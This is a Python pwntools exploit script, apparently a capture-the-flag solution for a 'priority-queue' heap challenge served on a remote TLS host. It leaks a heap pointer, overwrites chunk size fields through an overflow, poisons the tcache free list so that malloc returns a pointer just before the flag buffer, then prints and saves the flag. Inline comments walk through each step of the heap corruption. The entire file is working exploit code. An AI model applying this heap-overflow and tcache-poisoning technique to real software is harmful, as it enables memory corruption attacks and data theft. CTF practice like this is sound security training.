from pwn import *

exe = ELF('./chall')
libc = ELF('./libc.so.6')
context.binary = exe
context.log_level = 'info'

HOST = 'priority-queue.opus4-7.b01le.rs'
PORT = 8443

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True)
    if args.GDB:
        return gdb.debug('./chall', '''
            c
        ''', aslr=False)
    return process('./chall')

PROMPT = b'Operation (insert/delete/peek/edit/count/quit): \n'

def op(io, name):
    io.sendlineafter(PROMPT, name)

def insert(io, data):
    op(io, b'insert')
    io.sendlineafter(b'Message: \n', data)

def delete(io):
    op(io, b'delete')
    return io.recvline().rstrip(b'\n')

def peek(io):
    op(io, b'peek')
    return io.recvline().rstrip(b'\n')

def edit_exact(io, data):
    op(io, b'edit')
    io.recvuntil(b'Message: \n')
    assert len(data) == 32
    io.send(data)

def count(io):
    op(io, b'count')
    return int(io.recvline().strip())

io = conn()
io.recvuntil(b'interface ===\n')

# ============ PHASE 1: HEAP LEAK ============
insert(io, b'd')
insert(io, b'c')
insert(io, b'b')
insert(io, b'a')
delete(io); delete(io); delete(io)

edit_exact(io, b'Z' * 32)
leaked = peek(io)
b_user = u64(leaked[32:].ljust(8, b'\x00'))
d_chunk = b_user - 0x50
flag_user = d_chunk - 0xb0
log.info('d_chunk=%#x flag_user=%#x', d_chunk, flag_user)

# ============ PHASE 2: FIX c's header and drain tcache ============
# Restore c.prev_size=0, c.size=0x21
fix_payload = b'A' * 16 + p64(0) + p64(0x21)
edit_exact(io, fix_payload)

# Drain tcache[0x20] by popping all 3 entries (c, b, a from heads).
# These allocs use tcache. New chunks reuse c's, b's, a's slots.
# Strings: use '9', '8', '7' so they sort later than 'a'... but 'a'=0x61, '9'=0x39,
# so digits < letters. Hmm 'd'=0x64. So 'd' is largest. 'a'=0x61. Digits are LESS than letters.
# Hmm wait we deleted a, b, c. We still have d in array.
# d's string = "Z"*32 at first 32 bytes (from earlier edit), then 'A'*16 + ... from fix edit.
# Actually last edit was fix_payload = 'A'*16 + \x00*8 + \x21\x00*...
# d's data now = 'AAAAAAAAAAAAAAAA' + \x00...
# So d's string effectively = "AAAA...A" (16 A's), terminated by null.

# For strcmp, d < something with "AAA..." first. Strings with 'A' prefix < 'a' prefix (uppercase < lowercase).
# Hmm 'A'=0x41, '7'=0x37, so '7'<'A'.

# Let's use different markers. I'll insert specific strings.

insert(io, b'<9')  # 2 chars. '<' = 0x3c. "<9" compares...
insert(io, b'<8')
insert(io, b'<7')

# Now we have in array: d ("AAA..."), "<9" (at H+0x20), "<8" (at H+0x40), "<7" (at H+0x60).
# Sort: "<7" < "<8" < "<9" < "AAAAA..." (since '<'=0x3c < 'A'=0x41).
# Hmm actually "<" < "A" in ASCII yes.
# array[0] = "<7" (chunk at H+0x60).

# But d's data = "A"*16+\0. And "<7" = 0x3c 0x37 \0. "<7" < "A" yes.

# For our attack, we need 3 NEW adjacent chunks beyond these. Use strings that sort smaller.
# Insert 3 more: "!", "#", "%" (0x21, 0x23, 0x25) — all smaller than "<".

insert(io, b'!')   # A at top (H+0x80)
insert(io, b'#')   # B at H+0xa0
insert(io, b'%')   # C at H+0xc0

# array[0] = "!" (A at H+0x80).
log.info('count after inserts: %d', count(io))

# Edit A: corrupt B.size
# Keep A's string smallest so A remains array[0] after move_down.
# First 16 bytes = A's new data. Use \x01\x01... so "A"<"!"(=0x21) still (0x01 < 0x21).
a_edit = b'\x01' * 16 + p64(0) + p64(0x31)  # B.prev_size=0, B.size=0x31
edit_exact(io, a_edit)

delete(io)  # free A (size=0x20). Tcache[0x20]: A.
delete(io)  # free B (corrupted size=0x31). Tcache[0x30]: B.
delete(io)  # free C (size=0x20). Tcache[0x20]: C → A.

# Now tcache[0x20]: C → A. tcache[0x30]: B.
# array has: ["<7","<8","<9", "AAA..."] (d). array[0] = "<7".

# ============ PHASE 3: TCACHE POISON ============
# Insert with strlen=38 → 0x30 bin → pops B.
# strcpy overflows into C.fd at H+0xd0.
target = flag_user - 0x20
target_bytes = p64(target)
assert target_bytes[6:] == b'\x00\x00'
assert all(b != 0 for b in target_bytes[:6])

poison_payload = b'X' * 32 + target_bytes[:6]
log.info('poison payload: %r (len %d)', poison_payload, len(poison_payload))

insert(io, poison_payload)

# Now C.fd points at flag_user - 0x20.
# Pop C first, then target.

insert(io, b'Y')  # pops C. Tcache[0x20]: target.
# String "Y" (0x59) — stores string "Y\0" at C.user = H+0xd0.

insert(io, b'\x01')  # pops target. Strlen=1 (valid, non-whitespace).
# This alloc returns target = flag_user - 0x20. strcpy writes "\x01\0" at target.
# array gets pointer = target = flag_user - 0x20.

# This new chunk has string "\x01" which is lex smallest (byte 0x01 < everything).
# array[0] = this chunk = flag_user - 0x20.

log.info('count after poison: %d', count(io))

# Edit array[0] with 32 non-null bytes: writes [flag_user-0x20, flag_user).
# Flag content at [flag_user, ...) untouched.
# Use \x01 bytes so string stays lex smallest (byte 0 = 0x01 < everything else).
edit_exact(io, b'\x01' * 32)

# Peek: puts(flag_user - 0x20). Reads 32 non-null + flag content until null.
leaked_flag = peek(io)
log.info('leaked output: %r', leaked_flag)

# Extract flag
if b'bctf{' in leaked_flag:
    flag_start = leaked_flag.index(b'bctf{')
    flag_end = leaked_flag.index(b'}', flag_start) + 1
    flag = leaked_flag[flag_start:flag_end]
    log.success('FLAG: %s', flag.decode())
    with open('flag.txt', 'wb') as f:
        f.write(flag)
else:
    log.warning('Flag not found in output. Leak may be partial.')

io.close()
